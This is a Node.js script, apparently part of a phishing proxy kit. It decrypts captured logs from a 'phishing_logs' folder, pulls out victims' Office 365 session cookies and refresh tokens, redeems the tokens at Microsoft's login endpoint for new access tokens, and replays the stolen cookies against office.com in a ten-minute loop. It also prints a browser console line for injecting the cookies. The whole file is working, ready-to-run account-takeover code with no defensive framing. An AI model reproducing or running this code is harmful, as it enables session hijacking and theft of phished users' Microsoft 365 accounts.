// ============================================================
// 𝙲𝙾𝙾𝙺𝙸𝙴 𝚁𝙴𝙿𝙻𝙰𝚈𝙴𝚁 — 𝙰𝚄𝚃𝙾𝙼𝙰𝚃𝙴𝙳 𝚂𝙴𝚂𝚂𝙸𝙾𝙽 𝙼𝙰𝙸𝙽𝚃𝙴𝙽𝙰𝙽𝙲𝙴
// ============================================================

const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ============================================================
// 𝙲𝙾𝙽𝙵𝙸𝙶
// ============================================================
const LOG_DIR = './phishing_logs';
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y';

// Office 365 token refresh endpoint
const REFRESH_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';

// Client ID from your lure
const CLIENT_ID = '4765445b-32c6-49b0-83e6-1d93765276ca';

// How often to check for new cookies (in milliseconds)
const INTERVAL = 10 * 60 * 1000; // 10 minutes

// ============================================================
// 𝙳𝙴𝙲𝚁𝚈𝙿𝚃 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (𝚌𝚘𝚙𝚒𝚎𝚍 𝚏𝚛𝚘𝚖 𝚙𝚛𝚘𝚡𝚢)
// ============================================================
function decryptData(encryptedData, ivHex) {
    const iv = Buffer.from(ivHex, 'hex');
    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, iv);
    let decrypted = decipher.update(Buffer.from(encryptedData, 'hex'));
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return decrypted.toString('utf-8');
}

// ============================================================
// 𝙴𝚇𝚃𝚁𝙰𝙲𝚃 𝙲𝙾𝙾𝙺𝙸𝙴𝚂 𝙵𝚁𝙾𝙼 𝙻𝙾𝙶𝚂
// ============================================================
function extractCookiesFromLogs() {
    const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
    if (files.length === 0) return null;
    
    // Sort by modification time (newest first)
    const latest = files.sort((a, b) => {
        return fs.statSync(path.join(LOG_DIR, b)).mtime - fs.statSync(path.join(LOG_DIR, a)).mtime;
    })[0];

    const content = fs.readFileSync(path.join(LOG_DIR, latest), 'utf-8');
    const lines = content.split('\n').filter(line => line.trim());

    for (const line of lines) {
        try {
            const entry = JSON.parse(line);
            const iv = Object.keys(entry)[0];
            const encrypted = entry[iv];
            const decrypted = decryptData(encrypted, iv);
            const data = JSON.parse(decrypted);
            
            // Look for set-cookie headers
            if (data.proxyResponseHeaders && data.proxyResponseHeaders['set-cookie']) {
                const cookies = data.proxyResponseHeaders['set-cookie'];
                const cookieObj = {};
                cookies.forEach(cookie => {
                    const [nameValue] = cookie.split(';');
                    const [name, value] = nameValue.split('=');
                    if (name && value) {
                        cookieObj[name.trim()] = value.trim();
                    }
                });
                return cookieObj;
            }
        } catch (e) {
            // Skip invalid entries
        }
    }
    return null;
}

// ============================================================
// 𝙴𝚇𝚃𝚁𝙰𝙲𝚃 𝚁𝙴𝙵𝚁𝙴𝚂𝙷 𝚃𝙾𝙺𝙴𝙽 𝙵𝚁𝙾𝙼 𝙻𝙾𝙶𝚂
// ============================================================
function extractRefreshToken() {
    const files = fs.readdirSync(LOG_DIR).filter(f => f.endsWith('.log'));
    if (files.length === 0) return null;
    
    const latest = files.sort((a, b) => {
        return fs.statSync(path.join(LOG_DIR, b)).mtime - fs.statSync(path.join(LOG_DIR, a)).mtime;
    })[0];

    const content = fs.readFileSync(path.join(LOG_DIR, latest), 'utf-8');
    const lines = content.split('\n').filter(line => line.trim());

    for (const line of lines) {
        try {
            const entry = JSON.parse(line);
            const iv = Object.keys(entry)[0];
            const encrypted = entry[iv];
            const decrypted = decryptData(encrypted, iv);
            const data = JSON.parse(decrypted);
            
            // Check if this is a token response
            if (data.proxyRequestURL && data.proxyRequestURL.includes('/token')) {
                try {
                    const body = JSON.parse(data.proxyRequestBody);
                    if (body.refresh_token) {
                        return body.refresh_token;
                    }
                } catch (e) {}
            }
        } catch (e) {}
    }
    return null;
}

// ============================================================
// 𝚁𝙴𝙵𝚁𝙴𝚂𝙷 𝚃𝙾𝙺𝙴𝙽 𝚄𝚂𝙸𝙽𝙶 𝚁𝙴𝙵𝚁𝙴𝚂𝙷 𝚃𝙾𝙺𝙴𝙽
// ============================================================
async function refreshSession(refreshToken) {
    try {
        const response = await axios.post(REFRESH_URL, 
            new URLSearchParams({
                client_id: CLIENT_ID,
                refresh_token: refreshToken,
                grant_type: 'refresh_token'
            }),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
            }
        );
        
        if (response.data && response.data.access_token) {
            console.log('✅ Session refreshed successfully!');
            console.log('📦 New access token:', response.data.access_token.slice(0, 50) + '...');
            
            // You can save the new tokens to a file for later use
            fs.writeFileSync('new_tokens.json', JSON.stringify(response.data, null, 2));
            return response.data;
        }
    } catch (e) {
        console.log('❌ Refresh failed:', e.response?.data || e.message);
    }
    return null;
}

// ============================================================
// 𝙲𝙾𝙾𝙺𝙸𝙴 𝚁𝙴𝙿𝙻𝙰𝚈 𝙵𝚄𝙽𝙲𝚃𝙸𝙾𝙽 (𝚘𝚙𝚝𝚒𝚘𝚗𝚊𝚕)
// ============================================================
async function replayCookies(cookies) {
    if (!cookies) return;
    
    // Build cookie string for browser replay
    const cookieString = Object.entries(cookies)
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
    
    console.log('🍪 Replay cookie string:');
    console.log(cookieString);
    console.log('\n📋 To inject in browser console:');
    console.log(`document.cookie = "${cookieString}";`);
    
    // Optional: Actually use the cookies to make a request
    try {
        const response = await axios.get('https://www.office.com/', {
            headers: {
                'Cookie': cookieString,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        console.log('✅ Cookie replay successful! Status:', response.status);
    } catch (e) {
        console.log('⚠️ Cookie replay failed:', e.message);
    }
}

// ============================================================
// 𝙼𝙰𝙸𝙽 𝙻𝙾𝙾𝙿
// ============================================================
async function main() {
    console.log('🔄 Cookie Replayer started. Checking every', INTERVAL / 1000, 'seconds.');
    console.log('📁 Log directory:', LOG_DIR);
    console.log('🔑 Encryption key:', ENCRYPTION_KEY ? '✅ Set' : '❌ Missing!');
    
    while (true) {
        try {
            // 1. Try to get a refresh token first
            const refreshToken = extractRefreshToken();
            if (refreshToken) {
                console.log('🔑 Found refresh token, attempting to refresh session...');
                const result = await refreshSession(refreshToken);
                if (result) {
                    console.log('✅ Session refreshed!');
                }
            } else {
                console.log('ℹ️ No refresh token found yet. Checking for cookies...');
            }
            
            // 2. Extract latest cookies
            const cookies = extractCookiesFromLogs();
            if (cookies) {
                console.log('🍪 Found cookies:', Object.keys(cookies).join(', '));
                await replayCookies(cookies);
            } else {
                console.log('ℹ️ No cookies found yet. Waiting for captures...');
            }
            
        } catch (e) {
            console.log('⚠️ Error in main loop:', e.message);
        }
        
        // Wait before next iteration
        console.log(`\n💤 Sleeping for ${INTERVAL / 1000} seconds...\n`);
        await new Promise(resolve => setTimeout(resolve, INTERVAL));
    }
}

// ============================================================
// 𝚂𝚃𝙰𝚁𝚃
// ============================================================
main().catch(console.error);
